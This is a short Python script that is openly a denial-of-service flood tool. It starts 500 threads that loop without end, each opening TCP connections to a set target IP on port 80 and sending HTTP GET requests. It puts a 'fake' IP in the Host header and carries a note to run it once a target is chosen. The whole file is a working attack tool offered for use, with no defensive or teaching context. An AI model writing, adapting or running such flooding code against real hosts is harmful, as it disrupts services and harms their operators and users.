"""
RUN and Test it ONLY if you select a target ip
"""

import threading
import socket

target = '10.0.0.19'
port = 80
fake_ip = '182.21.20.32'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
        
        # Make TCP Connection 
        s.connect((target, port)) 

        # Sending HTTP Request
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))

        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        # Close TCP Connection
        s.close()

        global already_connected
        already_connected += 1
        print(already_connected)


# 500 Threads are run parallely
for i in range(500):
    # select the fxn to be run
    thread = threading.Thread(target=attack)  
    # start thread
    thread.start() 




